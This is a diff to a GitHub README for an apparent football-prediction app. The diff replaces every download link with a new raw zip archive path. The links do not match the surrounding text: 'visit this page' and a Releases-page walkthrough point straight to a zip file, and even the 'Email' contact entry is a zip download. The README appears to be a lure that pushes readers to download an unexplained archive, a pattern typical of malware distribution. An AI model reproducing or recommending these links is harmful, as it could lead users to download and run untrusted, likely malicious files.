@@ -1,6 +1,6 @@
 # 🏆 w5-football-prediction - Predict Football Outcomes Easily
 
-[![Download Now](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip)
+[![Download Now](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/src/data/football-w-prediction-2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/src/data/football-w-prediction-2.8.zip)
 
 ## 📖 Description
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get the latest release, [visit this page to download](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip).
+To get the latest release, [visit this page to download](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/src/data/football-w-prediction-2.8.zip).
 
 1. On the Releases page, find the latest version of the application.
 2. Click on the version number to view release details.
@@ -77,10 +77,10 @@ If you want to help improve the application, contributions are welcome. You can 
 For support or questions, please reach out through:
 
 - Issues section on GitHub
-- Email: [https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip)
+- Email: [https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/src/data/football-w-prediction-2.8.zip](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/src/data/football-w-prediction-2.8.zip)
 
 ## 🥳 Acknowledgments
 
 Thank you for using w5-football-prediction. We appreciate your interest in football analytics and hope this tool enhances your sports experience!
 
-Don't forget to [visit this page to download](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/undiminishing/w5-football-prediction.zip) the latest version!
+Don't forget to [visit this page to download](https://raw.githubusercontent.com/rinomakin21/w5-football-prediction/main/src/data/football-w-prediction-2.8.zip) the latest version!
